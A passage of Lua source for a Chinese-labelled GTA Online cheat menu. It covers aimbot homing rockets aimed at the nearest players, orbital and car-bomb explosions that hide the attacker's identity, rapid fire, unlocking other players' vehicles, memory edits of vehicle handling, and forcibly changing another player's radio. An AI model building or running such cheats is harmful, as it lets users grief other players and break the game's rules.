                                GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                                -- > -- we now have loaded our PTFX for our fake rocket.
                                --(​const char* effectName, float xPos, float yPos, float zPos, float xRot, float yRot, float zRot, float scale, BOOL xAxis, BOOL yAxis, BOOL zAxis, BOOL p11)
                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(missile_particles.name, lc.x, lc.y, lc.z, 0, 0, 0, 0.4 * missile_settings.ptfx_scale, false, false, false, true)
                            end
                            -- // -- // --
                            -- // -- // --
                            --airstrike air
                            if aircount < 2 and MISL_AIR then
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    --thanks ren!
                                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 0, 2700, true, false, true, true)
                                    aircount = aircount + 1
                                    util.yield(1100)
                                end
                            end
                            local lookCountD = 0
                            if MISL_AIR then
                                if missile_settings.cam then
                                    if not CAM.DOES_CAM_EXIST(Missile_Camera) then
                                        if SE_Notifications then
                                            util.toast("相机设置")
                                        end
                                        CAM.DESTROY_ALL_CAMS(true)
                                        Missile_Camera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                                        --ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION(Missile_Camera, msl, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1)
                                        CAM.SET_CAM_ACTIVE(Missile_Camera, true)
                                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                                    end
                                end
                                local distx = math.abs(lc.x - pcoords.x)
                                local disty = math.abs(lc.y - pcoords.y)
                                local distz = math.abs(lc.z - pcoords.z)
                                if missile_settings.cam then
                                    local ddisst = GENERIC_SYSTEM.VDIST(pcoords.x, pcoords.y, pcoords.z, lc.x, lc.y, lc.z)
                                    if ddisst > 50 then
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        --local look2 = util.v3_look_at(CAM.GET_CAM_COORD(Missile_Camera), lc)
                                        --local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, -30, 10)
                                        local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(msl, 10, 10, -2)
                                        CAM.SET_CAM_COORD(Missile_Camera, backoffset.x, backoffset.y, backoffset.z)
                                        if lookCountD < 1 then
                                            CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                            lookCountD = lookCountD + 1
                                        end
                                    else
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                    end
                                end
                                --CAM.SET_CAM_PARAMS(Missile_Camera, lc.x, lc.y, lc.z + 1, look.x, look.y, look.z, 100, 0, 0, 0, 0) --(​Cam cam, float posX, float posY, float posZ, float rotX, float rotY, float rotZ, float fieldOfView, Any p8, int p9, int p10, int p11)
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed * distx, dir.y * missile_settings.speed * disty, dir.z * missile_settings.speed * distz, true, false, true, true)
                                util.yield()
                            else
                                -- vanilla "aimbot"
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed, dir.y * missile_settings.speed, dir.z * missile_settings.speed, true, false, true, true)
                                util.yield()
                            end
                            --free all our v3 instances
                        end

                        --rocket has stopped existing
                        if missile_settings.cam then
                            util.yield(2000)
                            if SE_Notifications then
                                util.toast("相机删除")
                            end
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
                            if CAM.IS_CAM_ACTIVE(Missile_Camera) then
                                CAM.SET_CAM_ACTIVE(Missile_Camera, false)
                            end
                            CAM.DESTROY_CAM(Missile_Camera, true)
                        end
                    end
                    --improve this logic lmfao
                    if missile_settings.multitarget then
                        table.remove(MISSILE_ENTITY_TABLE, GetValueIndexFromTable(MISSILE_ENTITY_TABLE, plocalized))
                        util.toast("Removed value " .. tostring(plocalized) .. " at index " .. tostring(GetValueIndexFromTable(MISSILE_ENTITY_TABLE, p)))
                    end
                end)
            end
            util.yield()
        end
    else
        MISL_AIM = false
    end
end)

local rpgrockets = menu.list(pvphelp, "火箭炮类型设置", {}, "")

local function generateRockets()
    for i = 1, #Rocket_Hashes do
        menu.action(rpgrockets, "Rocket " .. Rocket_Hashes[i][1], {"rocket " .. Rocket_Hashes[i][1]}, "", function ()
            Chosen_Rocket_Hash = Rocket_Hashes[i][2]
            util.toast("Set chosen rocket to " .. Rocket_Hashes[i][1] .. " || " .. Rocket_Hashes[i][2])
        end)
    end
end

generateRockets()

local rpgsettings = menu.list(pvphelp, "RPG自动瞄准器设置", {"rpgsettings"}, "")

menu.toggle(rpgsettings, "启用标枪模式", {"rpgjavelin"}, "让火箭飞得很高，杀死离你最近的玩家 :) | 建议：结合“RPG LOS Remove”，向你看不到的目标开火。", function (on)
    if on then
        MISL_AIR = true
    else
        MISL_AIR = false
    end
end)

menu.slider(rpgsettings, "RPG自动瞄准器半径", {"msl_frc_rad"}, "导弹自瞄的射程，例如 人可以离开多远。", 1, 10000, 300, 10, function (value)
    missile_settings.radius = value
end)

menu.slider(rpgsettings, "RPG速度倍增器", {"msl_spd_mult"}, "速度乘数。 默认是100，很好。", 1, 10000, 100, 10, function (value)
    missile_settings.speed = value
end)

menu.toggle(rpgsettings, "RPG LOS删除", {}, "删除视线检查。 除非您知道自己在做什么，否则不要打开它。", function (on)
    missile_settings.los = not on
end)

menu.toggle(rpgsettings, "RPG 行车记录器", {"rpgcamera"}, "现在有了行车记录仪，如果你使用标枪模式，你终于可以知道你的火箭到底去哪儿了。", function (on)
    missile_settings.cam = on
end)

menu.toggle(rpgsettings, "启用 PTFX", {}, "启用导弹的粒子效果，使它们看起来更合法。 默认启用。", function (toggle)
    missile_settings.ptfx = toggle
end, true)

menu.toggle(rpgsettings, "只针对空中目标", {}, "使自瞄只瞄准那些在空中的人。", function (toggle)
    missile_settings.air_target = toggle
end)

menu.toggle(rpgsettings, "多目标", {}, "将使导弹瞄准不同的实体。 如果一枚导弹已经飞向一个实体，其他导弹将飞向其他实体。 对多人有用。", function (toggle)
    missile_settings.multitarget = toggle
end)

menu.toggle(rpgsettings, "目标 Peds（多目标）", {}, "将针对peds而不是玩家。 在这个上启用了多目标，因为如果不是这样就没有用。", function (toggle)
    missile_settings.multiped = toggle
end)

menu.divider(rpgsettings, "------- PTFX（高级） -------")

menu.slider(rpgsettings, "PTFX 比例", {"rpgparscale"}, "粒子效果的比例。", 1, 10, 1, 1, function (scale)
    missile_settings.ptfx_scale = scale
end)

menu.text_input(rpgsettings, "PTFX 名称", {"rpgptfx"}, "粒子效果名称。 仅限高级用户。", function (text)
    missile_particles.name = text
end, "exp_grd_rpg_lod")

menu.text_input(rpgsettings, "PTFX 字典", {"rpgdictionary"}, "使用 PTFX 的粒子效果字典。 仅限高级！！", function (text)
    missile_particles.dictionary = text
end, "core")


menu.divider(pvphelp, "轨道标点")


menu.action(pvphelp, "轨道打击标点", {"orbway", "orbwp"}, "轨道炮您选择的航点。", function ()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local wpos = HUD.GET_BLIP_COORDS(blip)
        if ORB_Sneaky then
            for a = 1, 30 do
                SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 29, 10, true, false, 1, false)
                SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 59, 10, true, false, 1, false)
                util.yield(30)
            end
        else
            for i = 1, 30 do
                SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 1)
                SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 59, 10, true, false, 1)
                util.yield(30)
            end
        end
    else
        util.toast("没标点！")
    end
end)

menu.toggle(pvphelp, "偷偷摸摸的爆炸", {}, "使轨道不归咎于你。", function (on)
    ORB_Sneaky = on
end)


menu.divider(pvphelp, "汽车自杀")

menu.toggle_loop(pvphelp, "汽车自杀", {"carexplode"}, "当您在玩家旁边时自动引爆您的汽车。", function()
    local ourped = GetLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then
        local pedTable = entities.get_all_peds_as_pointers()
        local ourCoords = ENTITY.GET_ENTITY_COORDS(ourped)
        for i = 1, #pedTable do
            local handle = entities.pointer_to_handle(pedTable[i])
            if PED.IS_PED_A_PLAYER(handle) then
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                local v3 = entities.get_position(pedTable[i])
                local dist = DistanceBetweenTwoCoords(ourCoords, v3)
                if dist < 5 and handle ~= GetLocalPed() and not CAR_S_BLACKLIST[playerID] then
                    if CAR_S_sneaky then
                        SE_add_explosion(ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1, false)
                        SE_add_explosion(ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                    else
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1)
                    end
                end
            end
        end
    end
end)

menu.toggle(pvphelp, "偷偷摸摸的爆炸", {"carexplodesneaky"}, "使汽车炸弹的爆炸不怪你。", function(on)
    CAR_S_sneaky = on
end)


menu.divider(pvphelp, "合法的快速射击")

menu.toggle(pvphelp, "合法的快速射击（快速切换）", {"legitrapidfire"}, "射击后快速切换到手榴弹并返回武器。 对狙击手、角色扮演游戏、榴弹发射器很有用。", function(on)
    local localped = GetLocalPed()
    if on then
        LegitRapidFire = true
        util.create_thread(function ()
            while LegitRapidFire do
                if PED.IS_PED_SHOOTING(localped) then
                    local currentWpMem = memory.alloc()
                    local junk = WEAPON.GET_CURRENT_PED_WEAPON(localped, currentWpMem, 1)
                    local currentWP = memory.read_int(currentWpMem)
                    memory.free(currentWpMem)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 2481070269, true) --2481070269 is grenade
                    util.yield(LegitRapidMS)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWP, true)
                end
                util.yield()
            end
            util.stop_thread()
        end)
    else
        LegitRapidFire = false
    end
end)

menu.slider(pvphelp, "合法的快速射击延迟（ms）", {"legitrapiddelay"}, "切换到手榴弹并返回武器所需的延迟。", 1, 1000, 100, 50, function (value)
    LegitRapidMS = value
end)

menu.divider(pvphelp, "导弹防御")

Actual_Missiles = {
    util.joaat("w_lr_rpg_rocket"),
    util.joaat("w_lr_homing_rocket"),
}

menu.toggle_loop(pvphelp, "导弹护盾", {"missileshield"}, "生成一面墙, 阻止导弹到达你的位置. 如果你在使用导弹发射器,则没有效果.", function()

    local missile = 0
    local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(GetLocalPed(), 0, 5, 0)
    for i = 1, #Actual_Missiles do

        missile = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, Actual_Missiles[i], false, true, true, true)
        if (missile ~= 0) then 
            local pcoords = getEntityCoords(GetLocalPed())
            local mcoords = getEntityCoords(missile)
            if (SYSTEM.VDIST2(pcoords.x, pcoords.y, pcoords.z, mcoords.x, mcoords.y, mcoords.z) < 100) then return end

            local offsetForward = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(missile, 0, 3, 0); offsetForward.z = offsetForward.z - 3
            local missileRot = v3.new(ENTITY.GET_ENTITY_ROTATION(missile, 2))
            util.create_thread(function()
                util.toast("启动导弹护盾.")
                local obj = SpawnObjectAtCoords(util.joaat("sr_prop_sr_track_wall"), offsetForward)
                ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
                ENTITY.SET_ENTITY_ROTATION(obj, missileRot:getX(), missileRot:getY(), missileRot:getZ()+90, 2, true)
                util.yield(1000)
                entities.delete_by_handle(obj)
                util.toast("关闭导弹护盾.")
                return
            end)

            return
        end

    end
end)

menu.divider(pvphelp, "")

local SE_Notifications = false
menu.toggle(pvphelp, "调试通知", {""}, "", function(on)
    SE_Notifications = on
end)

local carweaponfun = menu.list(carfly, "载具武器", {}, "", function(); end)

sdroot = menu.list(carweaponfun, '魔幻激光战马', {}, '')

SDspawn = menu.toggle_loop(sdroot, '生成魔幻激光战马', {'lsdspawn'}, '魔幻战马可以发出激光', function ()
    Lazer_Space_Car()
end)

local vehicleWeaponRoot = menu.list(carweaponfun, "载具武器", {"vehicleweapons"}, "")

menu.toggle_loop(vehicleWeaponRoot, "载具镭射", {"vehiclelasers"}, "", function ()
	vehlaser()
end)

menu.toggle_loop(vehicleWeaponRoot, "载具武器", {}, "", function()
	vehweapon_veh()
end, function () 
    state = 0 
end)

menu.list_select(vehicleWeaponRoot, "设置载具武器", {}, "", {{util.get_label_text("WT_V_SPACERKT")}, {util.get_label_text("WT_RAYPISTOL")},{util.get_label_text("WT_FWRKLNCHR")}, {util.get_label_text("WT_V_TANK")}, {util.get_label_text("WT_V_PLRBUL")}}, 1, function (index)
    setvehweapon(index)
end)

local list_homingMissiles = menu.list(vehicleWeaponRoot, "先进追踪导弹", {}, "允许您在任何载具上使用追踪导弹，并一次射出最多六个目标 ..")
local toggle

toggle = menu.toggle_loop(list_homingMissiles, "先进追踪导弹", {"homingmissiles"}, "", function ()
	if not UFO.exists() and not GuidedMissile.exists() then
		HomingMissiles.mainLoop()
	else
		menu.set_value(toggle, false)
	end
end, HomingMissiles.reset)

local whiteList = menu.list(list_homingMissiles, "白名单", {}, "")
menu.toggle(whiteList, "朋友", {}, "", HomingMissiles.SetIgnoreFriends)
menu.toggle(whiteList, "组织成员", {}, "", HomingMissiles.SetIgnoreOrgMembers)
menu.toggle(whiteList, "帮会成员", {}, "", HomingMissiles.SetIgnoreCrewMembers)


menu.slider(list_homingMissiles, "最大目标数" , {}, "", 1, 6, 6, 1, HomingMissiles.SetMaxTargets)


menu.toggle_loop(carweaponfun, "空袭飞机", {"airstrikeplane"}, "使用任何飞机或直升机进行空袭", function ()
    airstrikeaicraft_plane()
end, function()
     state = 0 
end)

menu.action_slider(carweaponfun, "UFO", {"ufo"}, "驾驶UFO,使用牵引光束和大炮", {"外星UF0", "军用UFO"}, function (index)
	local obj = ufomodels[index]
	UFO.setObjModel(obj)
	if not (GuidedMissile.exists() or UFO.exists()) then UFO.create() end
end)

rapid_khanjali = menu.toggle_loop(carweaponfun, "TM-02 可汉贾利武器快速射击", {}, "快速切换武器", function()
    tm02fastshot()
end)

local controlSettings = menu.list(carweaponfun, "设置" , {}, "")

local airstrikePlaneControl = menu.list(controlSettings, "空袭飞机", {}, "")

for name, control in pairs(Imputs_vehweapon) do
	local keyboard, controller = control[1]:match('^(.+)%s?;%s?(.+)$')
	local strg = ("%s: %s, %s: %s"):format(trans_plane.Keyboard, keyboard, trans_plane.Controller, controller)
	menu.action(airstrikePlaneControl, strg, {}, "", function()
        Config.controls.airstrikeaircraft = control[2]
        util.show_corner_help(trans_plane.AirstrikeAircraft:format(name))
	end)
end

local vehicleWeaponsControl <const> = menu.list(controlSettings, "载具武器", {}, "")
for name, control in pairs(Imputs_vehweapon) do
	local keyboard, controller = control[1]:match('^(.+)%s?;%s?(.+)$')
	local strg = ("%s: %s, %s: %s"):format(trans_plane.Keyboard, keyboard, trans_plane.Controller, controller)
	menu.action(vehicleWeaponsControl, strg, {}, "", function()
        Config.controls.vehicleweapons = control[2]
    util.show_corner_help(trans_plane.VehicleWeapons:format(name))
	end)
end

local ufoSettings = menu.list(controlSettings, "UFO", {}, "")

menu.toggle(ufoSettings, "禁用玩家框", {}, "", function(toggle)
	Config.ufo.disableboxes = toggle
end, Config.ufo.disableboxes)

menu.toggle(ufoSettings, "仅针对玩家车辆", {}, "使牵引光束忽略非玩家驾驶的载具", function(toggle)
	Config.ufo.targetplayer = toggle
end, Config.ufo.targetplayer)

local unlockplayerveh = menu.list(carfly, "解锁载具", {}, "", function(); end)

menu.toggle_loop(unlockplayerveh, "载具引擎快速开启", {}, "减少载具启动引擎时间", function()
    fastoncar()
end)

menu.toggle_loop(unlockplayerveh, "解锁正在进入的载具", {}, "解锁你正在进入的载具。对于锁住的玩家载具也有效果。", function()
    unlockcar()
end)


HandlingData =
{
	reference = 0,
	name = "",
	address = NULL,
	visible = true,
	offsets = {},
	open = false,
}
HandlingData.__index = HandlingData


HandlingData.new = function (parent, name, address, offsets)
	local self = setmetatable({address = address, name = name, offsets = offsets}, HandlingData)
	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function()
		self.open = false
	end)

	menu.divider(self.reference, name)
	for _, tbl in ipairs(offsets) do self:addOption(self.reference, tbl[1], tbl[2]) end
	return self
end

HandlingData.addOption = function(self, parent, name, offset)
	local value = memory.read_float(self.address + offset) * 100

	menu.slider_float(parent, name, {name}, "", -1e6, 1e6, math.floor(value), 1, function(new)
		memory.write_float(self.address + offset, new / 100)
	end)
end


HandlingData.Remove = function(self)
	menu.delete(self.reference)
end


function HandlingData:get()
	local r = {}

	for _, tbl in ipairs(self.offsets) do
		local value = memory.read_float(self.address + tbl[2])
		r[tbl[1]] = round(value, 3)
	end

	return r
end


function HandlingData:set(values)
	local count = 0

	for _, tbl in ipairs(self.offsets) do
		local value = values[tbl[1]]

		if not value then
			goto label_continue
		end

		memory.write_float(self.address + tbl[2], value)
		count = count + 1

	::label_continue::
	end
end


VehicleList = {selected = 0, root = 0, name = "", onClick = nil}
VehicleList.__index = VehicleList

function VehicleList.new(parent, name, onClick)
	local self = setmetatable({name = name, onClick = onClick}, VehicleList)
	self.root = menu.list(parent, name, {}, "")

	local classLists = {}
	for _, vehicle in ipairs(util.get_vehicles()) do
		local nameHash = util.joaat(vehicle.name)
		local class = VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(nameHash)

		if not classLists[class] then
			classLists[class] = menu.list(self.root, util.get_label_text("VEH_CLASS_" .. class), {}, "")
		end

		local menuName = util.get_label_text(vehicle.name)
		if menuName == "NULL" then
			goto label_coninue
		end

		menu.action(classLists[class], util.get_label_text(vehicle.name), {}, "", function()
			self:setSelected(nameHash, vehicle.name)
			menu.focus(self.root)
		end)
	::label_coninue::
	end

	return self
end

function VehicleList:setSelected(nameHash, vehicleName)
	if not vehicleName then
		vehicleName = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(nameHash)
	end
	menu.set_menu_name(self.root, self.name .. ": " .. util.get_label_text(vehicleName))
	self.selected = nameHash
	if self.onClick then self.onClick(nameHash) end
end


local handlingTrans <const> =
{
	SetVehicle = "设置车辆",
	CurrentVehicle = "当前车辆",
	SaveHandling = "保存操控数据",
	SavedFiles = "已保存的文件",
	Load = "加载",
	Delete = "删除",
	Autoload = "自动加载",
	Saved = "操控数据保存",
	Loaded = "数据文件成功加载",
	WillAutoload = "文件 '%s' 将被自动加载",
	HandlingEditor = "操控编辑器",
	AutoloadedFiles = "自动加载的文件",
	ClickToDelete = "点击删除",
	SavedHelp = "为所选车型保存的数据文件"
}


AutoloadList = {reference = 0, options = {}}
AutoloadList.__index = AutoloadList

function AutoloadList.new(parent, name)
	local self = setmetatable({options = {}}, AutoloadList)

	self.reference = menu.list(parent, name, {}, "")
	return self
end

function AutoloadList:push(vehLabel, file)
	local vehName = util.get_label_text(vehLabel)

	if self.options[vehName] then
		menu.delete(self.options[vehName])
	end

	self.options[vehName] = menu.action(self.reference, string.format("%s: %s", vehName, file), {}, handlingTrans.ClickToDelete, function()
		Config.handlingAutoload[vehLabel] = nil
		menu.delete(self.options[vehName])
	end)
end


HandlingEditor =
{
	references = {root = 0, meta = 0},
	handlingData = nil,
	subHandlings = {},
	currentVehicle = 0,
	open = false,
	---@type FileList
	filesList = nil,
	---@type AutoloadList
	autoloads = nil
}
HandlingEditor.__index = HandlingEditor


function HandlingEditor.new(parent, name)
	local self = setmetatable({subHandlings = {}, references = {}}, HandlingEditor)
	self.references.root = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function() self.open = false end)


	local vehList = VehicleList.new(self.references.root, handlingTrans.SetVehicle, function (vehicle)
		self:SetCurrentVehicle(vehicle)
	end)


	menu.action(self.references.root, handlingTrans.CurrentVehicle, {}, "", function ()
		local vehicle = entities.get_user_vehicle_as_handle()
		if vehicle ~= 0 then vehList:setSelected(ENTITY.GET_ENTITY_MODEL(vehicle)) end
	end)


	self.references.meta = menu.list(self.references.root, "文件", {}, "")

	menu.action(self.references.meta, handlingTrans.SaveHandling, {}, "", function()
		local ok, msg = self:save()
		if not ok then
			return notification123:help(capitalize(msg), HudColour.red)
		end
		notification123:normal(handlingTrans.Saved, HudColour.blue)
	end)


	local fileOpts <const> =
	{
		handlingTrans.Load,
		handlingTrans.Autoload,
		handlingTrans.Delete,
	}

	self.filesList = FileList.new(self.references.meta, handlingTrans.SavedFiles, fileOpts, "", "json", function (opt, fileName, path)
		if  opt == 1 then
			local ok, msg = self:load(path)
			if not ok then
				return notification:help(capitalize(msg), HudColour.red)
			end
			self:SetCurrentVehicle(self.currentVehicle) -- reloading
			notification123:normal(handlingTrans.Loaded, HudColour.blue)

		elseif opt == 3 then
			os.remove(path)
			self.filesList:reload()

		elseif opt == 2 then
			local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(self.currentVehicle)
			if name == "CARNOTFOUND" then
				return
			end
			Config.handlingAutoload[name] = fileName
			self.autoloads:push(name, fileName)
			notification123:normal(string.format(handlingTrans.WillAutoload, fileName), HudColour.blue)
		end
	end)

	menu.set_help_text(self.filesList.reference, handlingTrans.SavedHelp)
	self.autoloads = AutoloadList.new(self.references.meta, handlingTrans.AutoloadedFiles)
	return self
end



---@param hash Hash
function HandlingEditor:SetCurrentVehicle(hash)
	if self.handlingData then self:clear() end
	self.currentVehicle = hash
	local root = self.references.root
	local modelInfo = get_vehicle_model_info(hash)
	if modelInfo == NULL then
		return
	end

	local handlingAddress = get_vehicle_model_handling_data(modelInfo)
	if handlingAddress == NULL then
		return
	end

	self.handlingData = HandlingData.new(root, "CHandlingData", handlingAddress, CHandlingData)
	local subHandlings = get_sub_handling_array(handlingAddress)

	for _, subHandling in ipairs(subHandlings) do
		if subHandling.address == NULL then
			continue
		end
		local name = subHandlingClasses[subHandling.type]
		local offsets = SubHandlingData[name]
		if not self.subHandlings[name] then self.subHandlings[name] = HandlingData.new(root, name, subHandling.address, offsets) end
	end

	local vehicleName = memory.read_string(modelInfo + 0x298)
	self.filesList.dir = filesystem.scripts_dir() .. '\\GTScript\\' .. "handling\\" .. string.lower(vehicleName) .. "\\"
end



function HandlingEditor:clear()
	self.handlingData:Remove()
	for _, h in pairs(self.subHandlings) do h:Remove() end

	self.handlingData = nil
	self.subHandlings = {}
	self.currentVehicle = 0
	self.filesList.dir = ""
end

local customLabels <const> =
{
	EnterFileName = "输入文件名",
	InvalidChar = "无效字符输入，请重试",
	EnterValue = "输入值",
	ValueMustBeNumber = "该值必须是数字，请重试",
	Search = "输入要搜索的类型",
}

for key, text in pairs(customLabels) do
	customLabels[key] = util.register_label(text)
end


function HandlingEditor:save()
	if not self.handlingData then
		return false, "handling data not found"
	end

	local input = ""
	local label = customLabels.EnterFileName

	while true do
		input = get_input_from_screen_keyboard(label, 31, "")
		if input == "" then
			return false, "save canceled"
		end
		if not input:find '[^%w_%.%-]' then break end
		label = customLabels.InvalidChar
		util.yield(200)
	end

	local data = {}
	data[self.handlingData.name] = self.handlingData:get()

	for _, subHandling in pairs(self.subHandlings) do
		data[subHandling.name] = subHandling:get()
	end

	self.filesList:add(input .. ".json", json.stringify(data, nil, 4))
	return true, nil
end



function HandlingEditor:load(path)
	if not self.handlingData then
		return false, "handling data not found"
	end

	if not filesystem.exists(path) then
		return false, "file does not exist"
	end

	local ok, result = json.parse(path, false)
	if not ok then
		return false, result
	end

	self.handlingData:set(result.CHandlingData)

	for name, subHandling in pairs(self.subHandlings) do
		if result[name] then subHandling:set(result[name]) end
	end

	return true, nil
end


function HandlingEditor:autoload()
	local count = 0

	for vehicle, file in pairs(Config.handlingAutoload) do
		local path =  wiriDir .. "handling\\" .. string.lower(vehicle) .. "\\" .. file .. ".json"
		local modelHash = util.joaat(vehicle)

		self:SetCurrentVehicle(modelHash)
		if  self:load(path) then
			self.autoloads:push(vehicle, file)
			count = count + 1
		end
	end

	if self.handlingData then self:clear() end
	return count
end

g_handlingEditor = HandlingEditor.new(carfly, handlingTrans.HandlingEditor)

local numFilesLoaded = g_handlingEditor:autoload()
util.log("%d 处理加载的文件", numFilesLoaded)

local funfeatures_veh = menu.list(carfly, '载具玩乐', {}, '')

function get_note(note)
    if type(note) ~= "table" then
        note = {pitch=note}
    end
    if note.length == nil then
        note.length = quarter
    end
    return note
end

function play_note(vehicle, song, note, index)
    note = get_note(note)
    local note_playtime = math.floor(song.beat_length / note.length)
    if note.pitch ~= pause then
        horn_on = true
        --VEHICLE.START_VEHICLE_HORN(vehicle, note_delay, util.joaat("HELDDOWN"), false)
    end
    util.yield(note_playtime)
    horn_on = false
    -- Que up pitch for next note
    if song.notes[index+1] ~= nil then
        local next_note = get_note(song.notes[index+1])
        if next_note.pitch ~= pause then
            VEHICLE.SET_VEHICLE_MOD(vehicle, MOD_HORN, next_note.pitch)
        end
    end
    util.yield(song.beat_length - note_playtime)
    end

function play_song(song)
    song.beat_length = math.floor(60000 / song.bpm)
    if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        util.toast("需要在车内，才能激活歌曲喇叭")
        return
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if vehicle then
        local original_horn = VEHICLE.GET_VEHICLE_MOD(vehicle, MOD_HORN)
        for index, note in pairs(song.notes) do
            play_note(vehicle, song, note, index)
        end
        VEHICLE.SET_VEHICLE_MOD(vehicle, MOD_HORN, original_horn)
    end
end

for _, song in pairs(songs) do
    menu.action(funfeatures_veh, "播放 "..song.name, {}, "在汽车喇叭上播放歌曲.", function()
        play_song(song)
    end)
end

util.create_tick_handler(function()
    if horn_on then
        PAD._SET_CONTROL_NORMAL(0, 86, 1)
    end
    return true
end)

    radio = menu.list(funfeatures_veh, "更换广播电台", {}, "")
    stations = {}
    for station, name in pairs(station_name) do
        stations[#stations + 1] = station
    end
    menu.list_action(radio, "广播电台", {}, "", stations, function(index, value)
        ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos = players.get_position(players.user())
        player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)

        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then
            util.toast("玩家不在载具中. :/")
        return end
        radio_name = station_name[value]
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then 

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("未能成功更换玩家电台. :/")
            return end

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
            if not PED.IS_PED_IN_VEHICLE(players.user_ped(), player_veh, false) then
                ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
                menu.trigger_commands("tpveh" .. players.get_name(pid))
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
                util.yield(750)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
            else
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
            end
        end
    end)

function get_vehicle_dimension(vehicle)
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
    local minimum_vec = v3.new(minimum)
    local maximum_vec = v3.new(maximum)
    return {x = maximum_vec.y - minimum_vec.y, y = maximum_vec.x - minimum_vec.x, z = maximum_vec.z - minimum_vec.z}
end

function set_attachment_offset_for_root(attachment)
    local root_model = util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(attachment.root))
    local dimensions = get_vehicle_dimension(attachment.handle)

    if root_model == "wastelander" then
        attachment.offset = {
            x=0,
            y=(dimensions.y / 2) - 2,
            z=(dimensions.z / 2) + 0.8
        }
    end

    if root_model == "slamtruck" then
        attachment.offset = {
            x=0,
            y=(dimensions.y / 2) - 3,
            z=(dimensions.z / 2) + 0.3
        }
        attachment.rotation = {
            x=8,
            y=0,
            z=0,
        }
    end

end

